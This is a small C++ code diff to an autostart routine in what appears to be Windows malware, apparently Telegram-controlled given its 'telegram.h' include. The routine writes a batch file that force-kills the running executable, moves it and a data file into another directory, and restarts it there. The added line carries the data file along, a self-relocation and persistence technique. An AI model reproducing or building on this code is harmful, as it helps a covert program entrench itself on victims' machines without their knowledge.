@@ -2,7 +2,7 @@
 #include <Windows.h>
 #include <fstream>
 #include "autostart.h"
-#include "constant.h"
+#include "globals.h"
 #include "telegram.h"
 #include "tools.h"
 
@@ -30,6 +30,7 @@ void autostart() {
         file.open("o.bat", std::ios::out);
         file << "TASKKILL /F /IM " << tools::get_exe() << std::endl
             << "move " << tools::get_exe() << +" " + path << std::endl
+            << "move " << DATA_FILENAME << +" " + path << std::endl
             << "move " << "shitoo " << path << std::endl
             << "start " + path + "/" + tools::get_exe() << std::endl
             << "exit";
